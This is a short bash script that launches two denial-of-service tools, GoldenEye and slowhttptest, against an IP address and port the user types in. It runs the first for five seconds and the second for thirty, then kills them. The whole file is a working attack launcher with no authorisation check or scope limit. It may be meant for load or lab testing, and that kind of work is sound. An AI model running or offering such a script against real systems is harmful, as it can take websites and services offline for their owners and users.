#!/bin/bash

check_program() {
	if ! command -v "$1" &>/dev/null; then
		echo "$1 is not installed. Please install it and try again."
		exit 1
	fi
}

find_goldeneye() {
	local search_paths=(
		"$HOME/GoldenEye/goldeneye.py"
		"/usr/local/bin/goldeneye.py"
		"/usr/bin/goldeneye.py"
		"/opt/GoldenEye/goldeneye.py"
	)

	for path in "${search_paths[@]}"; do
		if [ -f "$path" ]; then
			echo "$path"
			return
		fi
	done

	read -p "GoldenEye filepath not found. Please enter the full path to goldeneye.py: " custom_path
	if [ ! -f "$custom_path" ]; then
		echo "Its not there :("
		exit 1
	fi
	echo "$custom_path"
}

check_program python
check_program slowhttptest

# Find the GoldenEye script (kali bricked the binary)
goldeneye_path=$(find_goldeneye)

read -p "Enter the IP address: " ip_address
read -p "Enter the port: " port

python "$goldeneye_path" http://$ip_address:$port/ -d &
sleep 5
pkill -f goldeneye

slowhttptest -u http://$ip_address:$port/ &
sleep 30
pkill slowhttptest
